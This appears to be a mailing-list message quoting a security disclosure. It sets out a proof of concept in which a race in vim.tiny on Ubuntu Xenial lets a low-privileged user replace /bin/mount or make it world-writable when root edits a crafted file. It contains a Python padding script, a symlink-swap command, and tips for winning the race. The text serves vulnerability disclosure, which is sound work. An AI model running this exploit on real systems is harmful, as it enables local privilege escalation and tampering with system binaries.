Thanks for the reminder. here is the text from the original mail to your 
[vs]-list:

PS: POC for Ubuntu Xenial to overwrite /bin/mount with custom content by
creating a x.txt as another user (e.g. www-data) and having root edit it using
vim.tiny. Of course attacker would restore everything to normal afterwards
(omitted). On multicore machines, the race is not always won, for testing
purposes you can strace vim (making it slower) or add other machine load, e.g
" (cat /dev/zero | md5sum) &" as www-data. With strace, chance is nearly 100%
to replace /bin/mount with x.txt (including mode, ownership). With 24 md5sum
on a 4 core machine, chance is > 80% to make /bin/mount world writable,
otherwise also replacing the content, changing ownership.

* Create a rogue file of same size as user www-data: In real world attack,
attack would pad a file writeable by him to same size as a system library,
essential binary using spaces or newlines at the end of the file. For demo,
newlines only will do.

#!/usr/bin/python3 -BEsStt

import os

mountSize = os.stat('/bin/mount').st_size
targetFileName = 'x.txt'
targetFile = open(targetFileName, 'wb')
targetFile.write(b'\n' * mountSize)
targetFile.close()
os.chmod(targetFileName, 0o777)

* Use tool from https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=602333 to
replace with symlink. Start it as www-data after root started "vim.tiny x.txt"
but before saving file as root.

./DirModifyInotify --Watch x.txt --MovePath x.txt --LinkTarget
/bin/mount --WatchCount 0
